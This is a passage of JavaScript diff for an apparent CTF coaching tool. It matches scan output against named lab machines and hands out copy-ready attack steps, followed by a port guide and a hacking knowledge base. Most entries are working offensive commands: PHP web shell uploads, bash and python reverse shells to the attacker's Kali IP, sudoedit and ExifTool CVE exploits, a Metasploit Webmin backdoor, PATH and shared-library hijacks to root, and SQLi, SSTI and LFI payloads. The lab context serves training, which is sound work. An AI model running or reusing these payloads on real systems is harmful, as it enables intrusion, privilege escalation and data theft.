+ {re:/operator_drop\.php|\/uploads\b/i, p:58, kind:'next', m:'allgon', t:"Found the upload page", why:"Upload a tiny web shell as .phtml (.php is blocked).", c:R`printf '<?php system($_GET["c"]); ?>' > /tmp/runner.phtml
+curl -sS -F 'f=@/tmp/runner.phtml' http://{T}:37250/operator_drop.php`, see:"Server says 'uploaded'."},
+ {re:/\buploaded\b/i, p:60, kind:'next', m:'allgon', t:"Web shell uploaded", why:"Confirm it runs commands, then get a reverse shell.", c:R`curl -sS "http://{T}:37250/uploads/runner.phtml?c=id"
+# then listen (2nd terminal): nc -lvnp 4444
+curl -sS --get --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/{K}/4444 0>&1 &'" "http://{T}:37250/uploads/runner.phtml"`, see:"You catch a shell as liftop."},
+ {re:/liftop/i, p:70, kind:'next', m:'allgon', t:"You're in as liftop (Allgon)", why:"Read the Intermediate flag, then hunt the backup password for root.", c:R`id
+cat ~/Flag_Intermediate.txt
+find / -name '*.bak' 2>/dev/null`, see:"Intermediate ISEC{…}; find shows config.php.bak."},
+ {re:/config\.php\.bak|RidgeOps-Bak77|admin_password/i, p:82, kind:'next', m:'allgon', t:"Root password leaked", why:"The backup holds a password reused for root. Switch to root.", c:R`cat /opt/ridgeops-httpd/config.php.bak
+su - root
+# password: RidgeOps-Bak77
+id
+cat /root/Flag_Hard.txt`, see:"uid=0(root); Hard flag ISEC{…}."},
+
+ // ---- ERIDAN progress ----
+ {re:/public_proof=|cgi_health=|health\/static/i, p:55, kind:'next', m:'eridan', t:"Status file leaked the paths", why:"It names the public flag path. Read it.", c:R`curl -i http://{T}/easy_flag.txt`, see:"Easy flag ISEC{…}."},
+ {re:/archiveops/i, p:70, kind:'next', m:'eridan', t:"RCE as archiveops (Eridan)", why:"If that was a one-shot, get a reverse shell; then read the Intermediate flag and check sudo.", c:R`# listener: nc -lvnp 4444  (2nd terminal)
+# bash 50406.sh targets.txt /usr/bin/dash "/bin/bash -c 'bash -i >& /dev/tcp/{K}/4444 0>&1'"
+id
+cat /var/lib/eridan/foothold/intermediate_flag.txt
+sudo -n -l`, see:"Intermediate ISEC{…}; sudo shows a sudoedit rule."},
+ {re:/sudoedit \/etc\/eridan|NOPASSWD:\s*sudoedit/i, p:82, kind:'next', m:'eridan', t:"Limited sudoedit rule (CVE-2023-22809)", why:"Abuse SUDO_EDITOR to sneak in the sudoers policy file and change your rule to ALL.", c:R`env LC_ALL=C SUDO_EDITOR='sed -i s#sudoedit[[:space:]]/etc/eridan-maintenance/status.txt#ALL# -- /etc/sudoers.d/eridan-archiveops' sudoedit -n /etc/eridan-maintenance/status.txt
+sudo -n /bin/bash -c 'id; cat /root/hard_flag.txt'`, see:"uid=0(root); Hard flag ISEC{…}."},
+ {re:/NOPASSWD:\s*ALL/i, p:84, kind:'next', m:'eridan', t:"You now have full root sudo", why:"Read the Hard flag as root.", c:R`sudo -n /bin/bash -c 'id; cat /root/hard_flag.txt'`, see:"uid=0(root); ISEC{…}."},
+
+ // ---- MORVANE progress ----
+ {re:/exiftool.{0,6}12\.23|metadata_engine_version=12\.23/i, p:60, kind:'next', m:'morvane', t:"ExifTool 12.23 (CVE-2021-22204)", why:"Build a malicious image (the -s IP is your Kali), listen, then upload it via the 'media' field.", c:R`searchsploit -m 50911
+sudo apt install -y djvulibre-bin libimage-exiftool-perl
+python3 50911.py -s {K} 4444
+# nc -lvnp 4444 (2nd terminal), then:
+curl -i --max-time 900 -F "media=@$HOME/image.jpg" "http://{T}:8080/submit"`, see:"HTTP 303 + shell as mediaops."},
+ {re:/mediaops/i, p:70, kind:'next', m:'morvane', t:"Shell as mediaops (Morvane)", why:"Read the Intermediate flag, then set up the root-publisher profile trick.", c:R`id
+cat /var/lib/morvane/operator/intermediate_flag.txt`, see:"Intermediate ISEC{…}. Then do the Hard steps (2nd listener on 5555 + malicious config)."},
+ {re:/303 see other|HTTP\/1\.[01] 303/i, p:58, kind:'next', m:'morvane', t:"Upload accepted (303)", why:"The image entered processing. Check your nc listener — you should have a mediaops shell.", c:R`id`, see:"uid=…(mediaops)."},
+
+ // ---- VARELIS progress ----
+ {re:/rconfig version 3\.9\.4|\b3\.9\.4\b/i, p:58, kind:'next', m:'varelis', t:"rConfig 3.9.4", why:"Dump the operator password hash with the SQLi exploit.", c:R`searchsploit -m 48208
+python3 48208.py http://{T}:8080`, see:"operator:<32-hex MD5>."},
+ {re:/operator:[0-9a-f]{32}|20feaf6f/i, p:62, kind:'next', m:'varelis', t:"Got the MD5 hash", why:"Crack it offline with rockyou.", c:R`printf 'operator:20feaf6f9303e88fe630e6bfa29c4218\n' > operator.hash
+zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rock.txt
+john --format=Raw-MD5 --wordlist=/tmp/rock.txt operator.hash
+john --show --format=Raw-MD5 operator.hash`, see:"Password = network123."},
+ {re:/network123/i, p:64, kind:'next', m:'varelis', t:"Password cracked: network123", why:"Use the authenticated command-injection exploit (edit its payload line to bash -c for Ubuntu) for a shell as auditops.", c:R`searchsploit -m 48241
+# nc -lvnp 4444 (2nd terminal), then:
+python3 48241.py http://{T}:8080 operator network123 {K} 4444`, see:"Shell as auditops."},
+ {re:/auditops/i, p:70, kind:'next', m:'varelis', t:"Shell as auditops (Varelis)", why:"Read the Intermediate flag and check your one sudo rule.", c:R`id
+cat /var/lib/varelis/validation/jobs/operator-handoff/intermediate_flag.txt
+sudo -n -l`, see:"Intermediate ISEC{…}; NOPASSWD varelis-apply *."},
+ {re:/varelis-apply/i, p:82, kind:'next', m:'varelis', t:"sudo varelis-apply (path-traversal)", why:"Plant a plugin + a profile whose plugin path uses ../ so the root helper runs your shell.", c:R`nc -lvnp 5555
+cat > /var/lib/varelis/validation/plugins/root-shell <<'EOF'
+#!/usr/bin/env bash
+bash -c 'bash -i >& /dev/tcp/{K}/5555 0>&1'
+EOF
+chmod +x /var/lib/varelis/validation/plugins/root-shell
+cat > /var/lib/varelis/approved-profiles/root-shell.json <<'EOF'
+{ "name":"x","plugin":"../../../var/lib/varelis/validation/plugins/root-shell","source":"/var/lib/varelis/validation/jobs/approved/edge-fw-01.cfg" }
+EOF
+sudo /usr/local/sbin/varelis-apply /var/lib/varelis/approved-profiles/root-shell.json`, see:"Root shell on 5555 → cat /root/hard_flag.txt."},
+
+ // ---- NEMORIS progress ----
+ {re:/indexsvc/i, p:70, kind:'next', m:'nemoris', t:"Shell as indexsvc (Nemoris)", why:"Read the Intermediate flag, then find the local-only Webmin service.", c:R`id
+cat /var/lib/nemoris/indexops/intermediate_flag.txt
+ss -lntp`, see:"Intermediate ISEC{…}; 127.0.0.1:10000 (Webmin)."},
+ {re:/miniserv|webmin|127\.0\.0\.1:10000|:10000\b/i, p:80, kind:'next', m:'nemoris', t:"Local Webmin 1.890 (CVE-2019-15107)", why:"Port-forward it to Kali through your session, then exploit it as root (in msfconsole).", c:R`sessions -u 1
+sessions -i 2
+portfwd add -l 10080 -p 10000 -r 127.0.0.1
+background
+use exploit/linux/http/webmin_backdoor
+set RHOSTS 127.0.0.1
+set RPORT 10080
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST {K}
+set LPORT 5555
+run`, see:"ROOT session → cat /root/hard_flag.txt."},
+
+ // ---- CALVORA progress ----
+ {re:/FieldExchange/i, p:55, kind:'next', m:'calvora', t:"Found the SMB share", why:"Pull the Easy flag out of it.", c:R`smbclient //{T}/FieldExchange -N -c 'get easy_flag.txt /tmp/easy_flag.txt'
+cat /tmp/easy_flag.txt`, see:"Easy flag ISEC{…}."},
+ {re:/www-data/i, p:70, kind:'next', m:'calvora', t:"Shell as www-data (Calvora)", why:"Find the Intermediate flag, then hunt for a weird SUID binary.", c:R`id
+find / -name '*intermediate*flag*' 2>/dev/null
+find / -xdev -type f -perm -4000 2>/dev/null | sort`, see:"Intermediate ISEC{…}; spot /usr/local/bin/screen."},
+ {re:/screen 4\.05|\/usr\/local\/bin\/screen/i, p:80, kind:'next', m:'calvora', t:"SUID GNU Screen 4.05.00 (CVE-2017-5618)", why:"Get the exploit, serve it from Kali, run it on the target → root.", c:R`searchsploit -m 41154
+python3 -m http.server 8000
+# on target:
+cd /tmp; wget http://{K}:8000/41154.sh; chmod +x 41154.sh; ./41154.sh
+id
+cat /root/hard_flag.txt`, see:"uid=0(root); Hard flag ISEC{…}."},
+
+ // ---- TALVERIN progress ----
+ {re:/inventorysvc/i, p:70, kind:'next', m:'talverin', t:"Shell as inventorysvc (Talverin)", why:"Read the Intermediate flag, then inspect the root refresh service.", c:R`id
+cat /var/lib/talverin/operator/intermediate_flag.txt
+systemctl cat talverin-refresh.service
+ls -ld /opt/talverin/vendor/bin`, see:"Intermediate ISEC{…}; vendor/bin writable + first in PATH."},
+ {re:/asset-probe|talverin-refresh/i, p:80, kind:'next', m:'talverin', t:"Writable PATH dir + root service", why:"Drop a fake asset-probe in vendor/bin and trigger the service (it runs as root).", c:R`nc -lvnp 4448
+cat > /opt/talverin/vendor/bin/asset-probe <<'EOF'
+#!/usr/bin/sh
+exec /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{K}",4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/usr/bin/sh","-i"])'
+EOF
+chmod 755 /opt/talverin/vendor/bin/asset-probe
+touch /var/lib/talverin/queue/refresh.request`, see:"Root shell on 4448 → cat /root/hard_flag.txt."},
+
+ // ---- ORYNTH progress ----
+ {re:/restoreops/i, p:70, kind:'next', m:'orynth', t:"Shell as restoreops (Orynth)", why:"Read the Intermediate flag, then find the SUID verifier and its writable RUNPATH.", c:R`id
+cat /var/lib/orynth/operator/intermediate_flag.txt
+find / -perm -4000 -type f 2>/dev/null
+readelf -d /usr/local/libexec/orynth-restore-verify | grep -E 'NEEDED|RUNPATH'`, see:"Intermediate ISEC{…}; NEEDs liborynthrestore.so, RUNPATH /opt/orynth/lib."},
+ {re:/liborynthrestore|orynth-restore-verify|RUNPATH.*orynth/i, p:80, kind:'next', m:'orynth', t:"SUID RUNPATH library hijack", why:"Compile a malicious liborynthrestore.so on Kali, serve it, install it into /opt/orynth/lib, run the verifier to read any file as root. See the full Orynth steps below for the exact .c code.", c:R`# On KALI (full .c in the walkthrough below), then:
+gcc -shared -fPIC /tmp/reader.c -Wl,-soname,liborynthrestore.so -o /tmp/liborynthrestore.so
+python3 -m http.server 8011
+# On TARGET:
+cd /opt/orynth/lib
+curl -fsS "http://{K}:8011/liborynthrestore.so" -o liborynthrestore.so; chmod 0644 liborynthrestore.so
+/usr/local/libexec/orynth-restore-verify /root/hard_flag.txt
+cat /tmp/out.txt`, see:"out.txt = Hard flag ISEC{…}."},
+
+ // ---- DRAEVOS progress ----
+ {re:/kbsvc|kbmaint/i, p:70, kind:'next', m:'draevos', t:"Shell as kbsvc (Draevos)", why:"Read the Intermediate flag, then check your systemd authorization.", c:R`id
+find /var/lib/draevos -type f -readable 2>/dev/null
+pkaction | grep systemd1`, see:"Intermediate ISEC{…}; shows systemd1.manage-units."},
+ {re:/manage-units|systemd1/i, p:80, kind:'next', m:'draevos', t:"Over-broad systemd authorization", why:"Your group can run systemd units as root. Run a transient unit to read the Hard flag.", c:R`systemd-run --quiet --wait --pipe --collect --unit=p1 /usr/bin/id
+systemd-run --quiet --wait --pipe --collect --unit=p3 /bin/cat /root/hard_flag.txt`, see:"uid=0(root); Hard flag ISEC{…}."},
+
+ // ---- shared hints ----
+ {re:/robots\.txt|disallow:/i, p:40, kind:'next', t:"robots.txt spotted", why:"The Disallow path often hides the real target. Visit it.", c:R`curl -sS http://{T}/robots.txt`, see:"A hidden path to enumerate next."},
+ {re:/order by|union select|sql syntax|you have an error in your sql|1064|500 internal server error/i, p:50, kind:'next', t:"SQL injection territory", why:"A quote broke the query. Find the column count with ORDER BY, then UNION SELECT to pull data.", c:R`# add a quote to trigger it, then:
+# ...?id=1 ORDER BY 8-- -   (find the column count)
+# ...?id=-1 UNION SELECT 1,2,3,4,5,6,7,8-- -`, see:"The number where ORDER BY first errors = the column count."},
+ {re:/sharename|IPC\$|smbclient|NT_STATUS/i, p:42, kind:'next', t:"SMB shares visible", why:"Connect to a share and read files — the Easy flag is often here.", c:R`smbclient //{T}/SHARENAME -N -c 'ls'`, see:"Replace SHARENAME with the one you saw."},
+ // generic foothold fallback (low priority)
+ {re:/uid=\d+\([a-z0-9_-]+\)/i, p:52, kind:'next', t:"You have a shell", why:"Confirm who you are, then enumerate for privilege escalation.", c:R`id; whoami; hostname
+sudo -n -l
+find / -perm -4000 -type f 2>/dev/null | sort
+find / -name '*flag*' -o -name '*.bak' 2>/dev/null`, see:"A sudo rule, odd SUID, or readable backup is your path to root."},
+ // nmap generic (lowest, only if nothing else)
+ {re:/nmap scan report|PORT\s+STATE|\d+\/tcp\s+open/i, p:20, kind:'ident', t:"Nmap results", why:"I couldn't match a specific service above. Look at the service/version and lock the machine below — ignore ports 22 (SSH) and 8443 (DCV).", c:R``, see:"Tell me the web app name/version or lock a machine."},
+];
+
+/* ========= ENGINE ========= */
+let T="",K="",lock=null;
+try{T=localStorage.getItem('aT')||"";K=localStorage.getItem('aK')||"";}catch(e){}
+function sub(s){return (s||"").replace(/\{T\}/g,T||"TARGET_IP").replace(/\{K\}/g,K||"KALI_IP");}
+function el(t,c,x){const e=document.createElement(t);if(c)e.className=c;if(x!=null)e.textContent=x;return e;}
+function term(txt){const t=el('div','term');t.textContent=txt;const b=el('button','copy','Copy');b.onclick=()=>{navigator.clipboard&&navigator.clipboard.writeText(txt).then(()=>{b.textContent='Copied!';b.classList.add('ok');setTimeout(()=>{b.textContent='Copy';b.classList.remove('ok');},1200);}).catch(()=>{});};t.append(b);return t;}
+
+/* ---- PORT LOOKUP: give any open port, get what to check ---- */
+const HTTPW={s:"HTTP web app",w:"A website — usually your main way in. Look at the homepage and robots.txt, then brute-force folders with gobuster.",c:R`curl -i http://{T}:{P}/
+curl -sS http://{T}:{P}/robots.txt
+gobuster dir -u http://{T}:{P}/ -w /usr/share/wordlists/dirb/common.txt`};
+const PORTS={
+ "21":{s:"FTP",w:"Try logging in anonymously — public files/flags are often exposed here.",c:R`ftp {T} {P}
+# user: anonymous   password: (press Enter)`},
+ "22":{s:"SSH",w:"Note it, but don't attack it directly — you need a password or a stolen key first.",c:""},
+ "23":{s:"Telnet",w:"Connect and read the banner.",c:R`telnet {T} {P}`},
+ "25":{s:"SMTP (mail)",w:"Mail server — try enumerating usernames.",c:R`nmap -p{P} --script smtp-commands,smtp-enum-users {T}`},
+ "53":{s:"DNS",w:"Try a zone transfer or an ANY lookup for hostnames.",c:R`dig @{T} <domain> ANY`},
+ "80":HTTPW,"443":HTTPW,"8000":HTTPW,"8080":HTTPW,"8081":HTTPW,"8088":HTTPW,"8983":HTTPW,"9000":HTTPW,"9090":HTTPW,"9443":HTTPW,"9999":HTTPW,"65001":HTTPW,
+ "110":{s:"POP3 (mail)",w:"Mail access — try any creds you find.",c:""},
+ "143":{s:"IMAP (mail)",w:"Mail access — try any creds you find.",c:""},
+ "111":{s:"RPC / NFS mapper",w:"Usually means NFS — list and mount shared folders.",c:R`showmount -e {T}
+rpcinfo -p {T}`},
+ "2049":{s:"NFS",w:"Network file share — list exports and mount them.",c:R`showmount -e {T}`},
+ "135":{s:"MS RPC",w:"Windows RPC — try to enumerate.",c:R`rpcclient -U "" -N {T}`},
+ "139":{s:"SMB (NetBIOS)",w:"File shares — list them with no password.",c:R`smbclient -L //{T} -N`},
+ "445":{s:"SMB",w:"File shares — list them with no password; the easy flag is often sitting in a share.",c:R`smbclient -L //{T} -N
+nmap -p445 --script smb-os-discovery,smb-enum-shares {T}`},
+ "161":{s:"SNMP (UDP)",w:"Often leaks usernames, processes and config.",c:R`snmpwalk -v2c -c public {T}`},
+ "88":{s:"Kerberos",w:"Kerberos = this host is a Domain Controller (Active Directory).",c:""},
+ "389":{s:"LDAP",w:"Active Directory — likely a Domain Controller. Enumerate the domain.",c:R`nmap -p389 --script ldap-rootdse {T}`},
+ "636":{s:"LDAPS",w:"Secure LDAP — Domain Controller.",c:""},
+ "3268":{s:"Global Catalog",w:"Domain Controller (AD forest queries).",c:""},
+ "464":{s:"Kerberos pw-change",w:"Domain Controller.",c:""},
+ "1433":{s:"MSSQL",w:"SQL Server DB — try default/weak creds.",c:""},
+ "1521":{s:"Oracle DB",w:"Oracle database — try default creds.",c:""},
+ "3306":{s:"MySQL/MariaDB",w:"Database — try root with an empty/weak password.",c:R`mysql -h {T} -u root`},
+ "5432":{s:"PostgreSQL",w:"Database — try default creds.",c:""},
+ "6379":{s:"Redis",w:"Often has NO auth — connect straight in.",c:R`redis-cli -h {T}`},
+ "27017":{s:"MongoDB",w:"Database — often no auth.",c:""},
+ "3389":{s:"RDP",w:"Remote desktop — needs valid credentials.",c:""},
+ "5985":{s:"WinRM",w:"Windows remote mgmt — use evil-winrm once you have creds.",c:""},
+ "5986":{s:"WinRM (SSL)",w:"Windows remote mgmt — needs creds.",c:""},
+ "5900":{s:"VNC",w:"Remote screen — try connecting / a default password.",c:""},
+ "10000":{s:"Webmin",w:"Webmin admin panel — often the privilege-escalation target (CVE-2019-15107).",c:""},
+ "8443":{s:"Amazon DCV",w:"⚠ This is the RONIN PLATFORM, not the challenge. IGNORE it.",c:""},
+};
+function foundPorts(text){const set=new Set();let m;
+ const r1=/\b(\d{1,5})\/(?:tcp|udp)\b/gi; while(m=r1.exec(text))set.add(m[1]);
+ const r2=/\bports?\s*:?\s*(\d{1,5})\b/gi; while(m=r2.exec(text))set.add(m[1]);
+ text.split(/\n/).forEach(l=>{if(/^\s*\d{1,5}\s*$/.test(l))set.add(l.trim());});
+ return [...set].filter(p=>PORTS[p]).sort((a,b)=>a-b);
+}
+function renderPortCards(text,res){
+ const ps=foundPorts(text); if(!ps.length) return false;
+ const h=el('div','headline','🔌 Ports I spotted — what each one is for'); h.style.marginTop="16px"; res.append(h);
+ ps.forEach(p=>{const e=PORTS[p]; const c=el('div','card');
+  c.append(el('span','tag t-info','PORT '+p));
+  c.append(el('div','headline',p+" — "+e.s));
+  c.append(el('div','why',sub(e.w)));
+  if(e.c&&e.c.trim()) c.append(term(sub(e.c.replace(/\{P\}/g,p))));
+  res.append(c);
+ });
+ return true;
+}
+/* ---- KNOWLEDGE BASE: ask a plain question OR paste a command/term ---- */
+const KB=[
+ {k:["start","first","begin","how to start","what to do first","new target","approach"],q:"How to start a box",a:"1) Scan all ports. 2) Ignore 22 and 8443 (that's the platform). 3) Pick the web/other service and enumerate it. 4) Easy flag = a public file; then exploit a versioned service for a shell; then escalate to root.",c:R`sudo nmap -Pn -sC -sV -p- --open {T}`},
+ {k:["easy flag","first flag","find easy","get easy flag"],q:"Finding the Easy flag",a:"Almost always public, no exploit needed: anonymous FTP (pub/), an open SMB share, or a web page/report/manifest. Check robots.txt and gobuster the site.",c:R`curl -sS http://{T}:PORT/robots.txt`},
+ {k:["i have a shell","got shell","shell now what","foothold","now what","after shell","intermediate flag"],q:"You got a shell - now what",a:"Confirm who you are, grab the user (intermediate) flag, then look for a way to root.",c:R`id; whoami
+sudo -n -l
+find / -perm -4000 -type f 2>/dev/null | sort
+find / -name '*flag*' -o -name '*.bak' 2>/dev/null`},
+ {k:["get root","privilege escalation","privesc","become root","how to root","escalate","root access"],q:"How to get root (privilege escalation)",a:"Check in order: (1) sudo -n -l - any allowed command? (2) unusual SUID binary. (3) readable backup/config with a password. (4) writable script run by root (cron/timer/PATH). (5) a service CVE.",c:R`sudo -n -l
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab`},
+ {k:["am i root","how do i know root","check root","verify root","proof of root"],q:"Are you root?",a:"Run id. If it shows uid=0(root) you're root - now read /root/hard_flag.txt. A fancy prompt alone does NOT prove root.",c:R`id`},
+ {k:["flag format","what does flag look","flag look like","format of flag"],q:"Flag format",a:"Flags look like ISEC{32 hex characters}. Copy the whole thing including ISEC{ and the closing }.",c:""},
+ {k:["my kali ip","my ip","attacker ip","what is my ip","find my ip","lhost","callback address"],q:"Find your Kali IP",a:"This is your LHOST / callback for reverse shells. Use the eth0 address, never 127.0.0.1.",c:R`ip -br -4 addr`},
+ {k:["which port","target port","what port","web port","port of app"],q:"Which port is the target on",a:"Whatever nmap showed as open that isn't 22 or 8443. These boxes often use odd high ports - put that port into the commands.",c:""},
+ {k:["reverse shell","revshell","get a shell","callback","shell back"],q:"Get a reverse shell",a:"Start a listener on Kali FIRST, then run the payload on the target so it connects back to you.",c:R`# Kali (2nd terminal):
+nc -lvnp 4444
+# Target:
+bash -c "bash -i >& /dev/tcp/{K}/4444 0>&1"`},
+ {k:["listener","nc -lvnp","netcat","catch shell","start listener","nc"],q:"Start a listener (netcat)",a:"Catches an incoming shell. Start it BEFORE firing the reverse shell, in its own terminal.",c:R`nc -lvnp 4444`},
+ {k:["shell not connecting","reverse shell not working","no connection","shell fails","didnt connect","not catching","connection refused"],q:"Reverse shell won't connect",a:"Check: (1) listener running first? (2) correct Kali IP? (3) same port both sides? (4) dash problem - wrap it in bash -c '...'. (5) try the python one-liner.",c:R`bash -c "bash -i >& /dev/tcp/{K}/4444 0>&1"`},
+ {k:["stabilize","upgrade shell","tty","full shell","proper shell","pty","dumb shell","no tab"],q:"Make a dumb shell usable (TTY)",a:"If tab/arrows/su don't work, upgrade the shell:",c:R`python3 -c 'import pty;pty.spawn("/bin/bash")'
+# then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm`},
+ {k:["dash","bin/sh","bad file descriptor","dev/tcp"],q:"dash vs bash (/dev/tcp fails)",a:"On Ubuntu /bin/sh is dash, which has no /dev/tcp, so reverse shells fail. Force bash to run it:",c:R`bash -c 'bash -i >& /dev/tcp/{K}/4444 0>&1'`},
+ {k:["transfer file","upload file","download to target","send file","http server","serve file","get file to target"],q:"Move a file Kali to target",a:"Serve it from Kali, pull it on the target.",c:R`# Kali:
+python3 -m http.server 8000
+# Target:
+wget http://{K}:8000/file`},
+ {k:["nmap","what is nmap","scan command","nmap flags"],q:"nmap - port/service scanner",a:"Finds open ports + service versions. -p- all ports, -sV versions, -sC default scripts, -Pn skip ping, --open only open.",c:R`sudo nmap -Pn -sC -sV -p- --open {T}`},
+ {k:["gobuster","dirb","dirbuster","directory brute","hidden folders","hidden pages","ffuf","feroxbuster","content discovery"],q:"gobuster - find hidden web paths",a:"Brute-forces folder/file names on a website. Use when a web port is open. -x adds extensions.",c:R`gobuster dir -u http://{T}:PORT/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`},
+ {k:["curl","fetch page","http request","read page","what is curl"],q:"curl - talk to a web server",a:"Fetches a URL from the terminal. -i shows headers, -s quiet, -F uploads a file, --data-urlencode sends data safely.",c:R`curl -i http://{T}:PORT/`},
+ {k:["searchsploit","exploit db","find exploit","exploit for","edb"],q:"searchsploit - find exploits",a:"Searches local Exploit-DB. Find by product+version, -p shows path/CVE, -m copies it to your folder.",c:R`searchsploit <product> <version>
+searchsploit -m <id>`},
+ {k:["smbclient","smb","share","list shares","enum4linux","smbmap"],q:"smbclient - browse SMB shares",a:"Lists and reads SMB file shares. -N = anonymous (no password). Easy flags often sit in a share.",c:R`smbclient -L //{T} -N
+smbclient //{T}/SHARE -N -c 'ls'`},
+ {k:["ftp","anonymous ftp"],q:"ftp - connect to FTP",a:"Log in as user anonymous with a blank password. Use ls, cd, get <file> to download.",c:R`ftp {T} 21`},
+ {k:["hydra","brute force login","bruteforce","password spray"],q:"hydra - brute-force a login",a:"Tries many passwords against ssh/ftp/http. Needs a username and a wordlist.",c:R`hydra -l USER -P /usr/share/wordlists/rockyou.txt {T} ssh`},
+ {k:["john","hashcat","crack hash","crack password","rockyou","cracking"],q:"Crack a hash (John)",a:"Guesses the password offline with rockyou. 32 hex chars = MD5 (Raw-MD5).",c:R`zcat /usr/share/wordlists/rockyou.txt.gz > /tmp/rock.txt
+john --format=Raw-MD5 --wordlist=/tmp/rock.txt hash.txt
+john --show --format=Raw-MD5 hash.txt`},
+ {k:["identify hash","what hash","hash type","32 characters","what kind of hash"],q:"Identify a hash",a:"32 hex = MD5 (Raw-MD5 / hashcat -m 0). 40 = SHA1. 64 = SHA256. $1$ = md5crypt, $6$ = sha512crypt. Then crack it.",c:""},
+ {k:["snmp","snmpwalk"],q:"snmpwalk - read SNMP",a:"SNMP (UDP 161) often leaks usernames/processes with community string 'public'.",c:R`snmpwalk -v2c -c public {T}`},
+ {k:["nfs","showmount","mount share"],q:"NFS - mount a network share",a:"List exports then mount to read files.",c:R`showmount -e {T}
+sudo mount -t nfs {T}:/SHARE /mnt`},
+ {k:["metasploit","msfconsole","msf","use exploit"],q:"Metasploit basics",a:"search <term> to find a module, use <module>, set RHOSTS/LHOST, check, run. sessions -i <n> to enter a shell.",c:R`msfconsole -q
+search <term>`},
+ {k:["dig","dns","zone transfer"],q:"DNS enumeration (dig)",a:"Look up records / try a zone transfer to find hostnames.",c:R`dig @{T} <domain> ANY`},
+ {k:["sql injection","sqli","union","order by","1064","sql error","single quote"],q:"SQL injection",a:"Add a quote to a parameter - a 500/SQL error means injectable. Find columns with ORDER BY, then UNION SELECT to pull data.",c:R`# ...?id=1'            (does it error?)
+# ...?id=1 ORDER BY 8-- -       (column count)
+# ...?id=-1 UNION SELECT 1,2,3,4,5,6,7,8-- -`},
+ {k:["command injection","rce","cmd injection","os command","remote code"],q:"Command injection / RCE",a:"User input reaches a system command. Test with id, then launch a reverse shell. Chain with ; | || or $(...).",c:R`# ...?param=; id
+# ...?param=| id`},
+ {k:["file upload","upload bypass","webshell","phtml","upload shell"],q:"File upload to web shell",a:"If .php is blocked, try .phtml / .php5 / .phar. Upload a tiny PHP runner, then call it with ?c=<command>.",c:R`printf '<?php system($_GET["c"]); ?>' > /tmp/x.phtml`},
+ {k:["lfi","local file inclusion","path traversal","directory traversal","read file","etc/passwd"],q:"LFI / path traversal",a:"A file parameter that accepts ../ lets you read files outside the web root (/etc/passwd, SSH keys).",c:R`curl "http://{T}:PORT/page?file=../../../../etc/passwd"`},
+ {k:["ssti","template injection","jinja"],q:"Template injection (SSTI)",a:"Inject {{7*7}} - if it returns 49 it runs template code (RCE). Payload: {{ cycler.__init__.__globals__.os.popen('id').read() }}",c:""},
+ {k:["idor","id enumeration","report id","sequential id","forced browsing","missing id"],q:"IDOR / predictable IDs",a:"If a page lists ids like 1042,1043,1045, request the missing 1044 directly - access control is often only hidden from the list.",c:R`curl -i http://{T}:PORT/api/reports/1044`},
+ {k:["robots","robots.txt","disallow"],q:"robots.txt",a:"Lists paths hidden from search engines - i.e. interesting paths to visit.",c:R`curl -sS http://{T}:PORT/robots.txt`},
+ {k:["sudo -l","sudo list","what can i sudo","sudo rights","sudo"],q:"sudo -l - what can I run as root",a:"Lists commands you may run as root. NOPASSWD = no password needed. A specific binary = check it for abuse.",c:R`sudo -n -l`},
+ {k:["suid","4000","setuid","perm -4000"],q:"SUID binaries",a:"Programs that run as their owner (often root). An unusual one is a classic root path.",c:R`find / -perm -4000 -type f 2>/dev/null | sort`},
+ {k:["backup","config","password in file","creds","readable file","cred reuse","leaked password"],q:"Hunt for leaked passwords",a:"Backups/configs often hold reused passwords. Search, read them, then try su - root or ssh.",c:R`find / -name '*.bak' -o -name '*.conf' 2>/dev/null
+grep -ri password /etc /opt /var 2>/dev/null | head`},
+ {k:["cron","crontab","scheduled","timer","systemd timer"],q:"Cron / timer jobs",a:"A root job that runs a script you can write to = root. Check what runs and whether you can edit it.",c:R`cat /etc/crontab
+systemctl list-timers`},
+ {k:["path hijack","unqualified command","vendor/bin"],q:"PATH hijack",a:"A root script calls a command with no full path and your folder is first in its PATH - drop a malicious file with that name there.",c:""},
+ {k:["ld_preload","shared object","runpath","rpath","so hijack","library hijack"],q:"Shared-library hijack",a:"A SUID binary loads a .so from a writable folder (RUNPATH). Compile a .so exporting the needed symbol - it runs as root.",c:R`readelf -d /path/to/binary | grep -E 'NEEDED|RUNPATH'`},
+ {k:["su","switch user","become user"],q:"su - switch user",a:"Log in as another user if you have their password.",c:R`su - root`},
+ {k:["uid","what is uid","gid","groups"],q:"What uid / gid means",a:"uid=0 is root (full control). Any other number is a limited user. The name in brackets is the account, e.g. uid=995(archiveops).",c:""},
+ {k:["etc/passwd","passwd file","users list"],q:"/etc/passwd",a:"Lists all accounts (world-readable): usernames, homes, shells. Great for spotting target users. No passwords here.",c:R`cat /etc/passwd`},
+ {k:["etc/shadow","shadow","password hashes"],q:"/etc/shadow",a:"Password hashes - only readable as root. If you can read it, crack the hashes with John.",c:""},
+ {k:["cve","what is cve","vulnerability id"],q:"What a CVE is",a:"A public ID for a known vulnerability (e.g. CVE-2021-42013). Match the service's exact version to a CVE, then find its exploit with searchsploit.",c:""},
+ {k:["port forward","tunnel","local only","127.0.0.1 service","ssh -L","portfwd","localhost service"],q:"Reach a localhost-only service (tunnel)",a:"If a service listens only on 127.0.0.1 on the target, forward it to your Kali.",c:R`ssh -L 9000:127.0.0.1:TARGETPORT user@{T}
+# then browse http://127.0.0.1:9000`},
+ {k:["strings","steghide","exiftool","hidden in image","steganography","metadata"],q:"Hidden data in files",a:"strings shows readable text in any file; exiftool reads metadata; steghide extracts data hidden in images.",c:R`strings file
+exiftool file`},
+ {k:["base64","decode","encode"],q:"base64 encode/decode",a:"Encode: base64 <file>. Decode: base64 -d. Used to move payloads as plain text.",c:R`echo TEXT | base64
+echo B64STRING | base64 -d`},
